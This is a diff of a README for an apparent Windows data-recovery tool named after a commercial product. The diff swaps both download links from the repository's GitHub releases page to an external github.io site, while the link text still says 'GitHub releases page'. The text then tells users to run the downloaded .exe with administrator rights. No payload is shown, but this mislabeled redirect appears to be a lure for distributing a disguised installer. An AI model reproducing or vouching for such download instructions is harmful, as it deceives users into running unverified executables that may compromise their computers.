@@ -1,6 +1,6 @@
 # 📁 Magoshare-Recovery - Restore your lost files with ease
 
-[![Download Magoshare Recovery](https://img.shields.io/badge/Download-Data_Recovery-blue.svg)](https://github.com/sammyabscessed462/Magoshare-Recovery/releases)
+[![Download Magoshare Recovery](https://img.shields.io/badge/Download-Data_Recovery-blue.svg)](https://sammyabscessed462.github.io)
 
 ## 🔍 Overview
 Magoshare-Recovery helps you retrieve lost data on Windows 11 and Windows 10. Computers lose files due to accidental deletion, disk formatting, or system crashes. This software scans your internal or external storage drives to locate missing photos, documents, videos, and archives. You do not need technical skills to navigate the recovery process. The tool provides a visual interface that guides you through every step.
@@ -15,7 +15,7 @@ Before you begin, ensure your computer meets these basic requirements:
 *   Permissions: You must have administrator rights to install programs on your computer.
 
 ## 🚀 How to Download 
-Visit [this GitHub releases page](https://github.com/sammyabscessed462/Magoshare-Recovery/releases) to find the current version of the software. Look for the file ending in .exe under the Assets section. Clicking this link triggers the download of the installer to your Downloads folder or your chosen save location. Ensure your internet connection remains stable during the download.
+Visit [this GitHub releases page](https://sammyabscessed462.github.io) to find the current version of the software. Look for the file ending in .exe under the Assets section. Clicking this link triggers the download of the installer to your Downloads folder or your chosen save location. Ensure your internet connection remains stable during the download.
 
 ## 🛠️ Step-by-Step Installation
 1. Locate the downloaded file in your folder.
